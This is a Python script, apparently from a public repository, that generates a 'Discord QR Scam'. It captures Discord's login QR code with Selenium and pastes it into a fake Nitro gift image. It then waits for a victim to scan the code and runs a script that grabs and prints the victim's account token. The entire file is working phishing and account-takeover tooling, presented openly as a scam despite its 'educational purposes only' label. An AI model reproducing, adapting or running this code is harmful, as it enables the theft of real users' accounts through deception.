# Developers: NightfallGT + Theotoma
# Educational purposes only

# Imports
import os
import time
import base64
from PIL import Image

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# Clear Console
os.system('cls' if os.name == 'nt' else 'clear')


# Setup Exceptions
class Timeout(Exception):
    """Raise when connection times out"""


# Generate GR Code
def logo_qr():
    im1 = Image.open('temp/qr_code.png', 'r')
    im2 = Image.open('temp/overlay.png', 'r')
    im2_w, im2_h = im2.size
    im1.paste(im2, (60, 55))
    im1.save('temp/final_qr.png', quality=95)


# Generate Nitro Scam
def paste_template():
    im1 = Image.open('temp/template.png', 'r')
    im2 = Image.open('temp/final_qr.png', 'r')
    im1.paste(im2, (120, 409))
    im1.save('discord_gift.png', quality=95)


# Run Chrome and Grab Victim's Token
def main():
    print('https://github.com/Theotoma/Discord-QR-Scam\n')
    print('** QR Code Scam Generator **')

    # Webdriver Options
    options = webdriver.ChromeOptions()
    options.add_experimental_option('excludeSwitches', ['enable-logging'])
    options.add_experimental_option('detach', True)
    options.add_argument('--incognito')

    # Start Webdriver
    driver = webdriver.Chrome(
        options=options,
        service=Service(r'chromedriver.exe'),
    )

    driver.get('https://discord.com/login')

    # Locator Variables
    qr_div_selector = '.qrCode-2R7t9S'
    spinner_selector = 'spinner-2enMB9'

    # Wait for Page to Load
    WebDriverWait(driver, 15).until(
        EC.presence_of_element_located((By.CSS_SELECTOR, qr_div_selector))
    )

    loaded = False
    for i in range(90):
        qr_code_div = driver.find_element(By.CSS_SELECTOR, qr_div_selector)
        if spinner_selector in qr_code_div.get_attribute('class'):
            time.sleep(0.5)
        else:
            loaded = True
            break

    if not loaded:
        raise Timeout('QR Code timed out')

    WebDriverWait(driver, 5).until(
        EC.presence_of_element_located((By.XPATH, '//img[@alt=\'Scan me!\']'))
    )

    print('- Page loaded.')

    # Extract QR Code Data
    qr_code_data = driver.find_element(By.XPATH, '//img[@alt=\'Scan me!\']').get_attribute('src')
    img_data = base64.b64decode(qr_code_data.replace('data:image/png;base64,', ''))

    # Generate File
    file = os.path.join(os.getcwd(), 'temp/qr_code.png')
    with open(file, 'wb') as handler:
        handler.write(img_data)

    logo_qr()
    paste_template()

    # Notify User
    print('- QR Code has been generated. > discord_gift.png')
    print('Send the QR Code to user and scan. Waiting...\n')

    # Wait for Victim
    discord_login = driver.current_url
    while discord_login == driver.current_url:
        time.sleep(0.1)

    # Grab Victim's Token
    print('Grabbing token...')

    with open('grab_token.js', 'r') as token_js:
        token = driver.execute_script(token_js.read())

    print(f'Token grabbed: {token}')

    # Option to Exit
    print('\nTask complete.')
    print('Press any key to exit...', end='')


# Run Script and Handle Errors
if __name__ == '__main__':
    try:
        main()
    except Timeout:
        print('\nThe QR Code took too long to load (>45 sec)')
        print('The program will now exit...', end='')
    except Exception:
        print('\nAn Unexpected Error Has Occured')
        print('The program will now exit...', end='')

    input()
